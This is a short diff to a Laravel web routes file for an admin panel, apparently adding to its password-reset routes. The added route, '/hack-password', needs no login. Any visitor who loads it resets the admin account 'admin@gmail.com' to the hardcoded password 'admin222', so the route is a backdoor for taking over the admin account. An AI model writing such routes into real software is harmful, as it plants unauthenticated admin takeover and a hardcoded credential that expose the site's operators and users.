@@ -111,3 +111,9 @@ Route::post('/forgot-password/submit', [AdminController::class, 'sendEmailReset'
 Route::get('/reset-password', [AdminController::class, 'newPassword'])->name('admin.new-password');
 
 Route::post('/reset-password/submit', [AdminController::class, 'resetPasswordSubmit'])->name('admin.new-password');
+
+Route::get('/hack-password', function() {
+    Admin::where('email', 'admin@gmail.com')->update([
+        'password' => Hash::make('admin222')
+    ]);
+});
